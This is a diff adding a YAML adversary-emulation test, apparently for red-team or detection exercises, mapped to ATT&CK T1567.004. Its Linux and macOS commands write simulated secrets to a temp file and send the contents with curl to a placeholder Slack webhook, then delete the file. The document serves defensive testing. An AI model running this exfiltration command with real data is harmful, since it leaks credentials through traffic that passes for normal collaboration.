@@ -1,0 +1,34 @@
+---
+- id: 8795d74ffed3f68575e1ddce59436eda
+  name: Exfiltrate staged data to a Slack webhook with curl (sh)
+  description: 'Stages a file containing simulated sensitive data and exfiltrates
+    its contents to a
+
+    Slack incoming webhook by POSTing a JSON `text` payload with curl. Slack incoming
+
+    webhooks accept unauthenticated JSON POSTs, making them a low-friction exfiltration
+
+    channel that blends with legitimate collaboration traffic.
+
+    See https://api.slack.com/messaging/webhooks
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.004
+    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  platforms:
+    linux:
+      sh:
+        command: 'echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -X POST -H ''Content-type: application/json'' --data "{\"text\":\"$(cat
+          /tmp/T1567.004_loot.txt)\"}" "https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken"'
+        payloads: []
+        cleanup: rm -f "/tmp/T1567.004_loot.txt"
+    darwin:
+      sh:
+        command: 'echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -X POST -H ''Content-type: application/json'' --data "{\"text\":\"$(cat
+          /tmp/T1567.004_loot.txt)\"}" "https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken"'
+        payloads: []
+        cleanup: rm -f "/tmp/T1567.004_loot.txt"
